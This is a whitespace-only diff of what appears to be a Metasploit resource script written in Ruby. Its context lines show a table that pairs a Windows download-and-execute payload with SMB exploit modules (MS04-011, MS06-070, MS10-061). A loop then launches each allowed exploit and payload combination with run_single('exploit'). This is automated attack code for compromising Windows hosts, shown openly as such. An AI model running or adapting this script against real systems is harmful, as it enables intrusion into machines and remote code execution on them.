@@ -3,7 +3,7 @@ version
 <ruby>
 	sleep(1)
 
-	shellcodes = { 
+	shellcodes = {
 		'download:exec' => {
 			'payload' => 'windows/download_exec',
 			'options' => {
@@ -48,7 +48,7 @@ version
 				'allow' => ['download:exec']
 			}
 		},
-	
+
 		'ms04-011' => {
 			'exploit' => 'exploit/windows/smb/ms04_011_lsass',
 			'shellcode' => {
@@ -80,11 +80,11 @@ version
 				'allow' => ['download:exec']
 			}
 		},
-		
+
 #		'ms06-066' => {
 #			'exploit' => ['exploit/windows/smb/ms06_066_nwapi','exploit/windows/smb/ms06_066_nwwks'],
 #		},
-	
+
 		'ms06-070' => {
 			'exploit' => 'exploit/windows/smb/ms06_070_wkssvc',
 			'shellcode' => {
@@ -115,7 +115,7 @@ version
 				'allow' => ['download:exec']
 			}
 		},
-		
+
 		'ms10-061' => {
 			'exploit' => 'exploit/windows/smb/ms10_061_spoolss',
 			'options' => {
@@ -140,15 +140,15 @@ version
 
 			isallowed = true
 			if xpv.has_key?('shellcode') then
-				isallowed = false		
+				isallowed = false
 				allow = xpv['shellcode']['allow']
 			else
 				allow = []
 			end
 
-			shellcodes.each { |sck, scv| 
+			shellcodes.each { |sck, scv|
 				allowed = isallowed
-				allow.each { |a| 
+				allow.each { |a|
 					if sck.match(/#{a}/) then
 						allowed = true
 						if xpv['shellcode'].has_key?('deny') then
@@ -178,6 +178,6 @@ version
 				run_single("exploit")
 			}
 		}
-		
+
 	end
 </ruby>
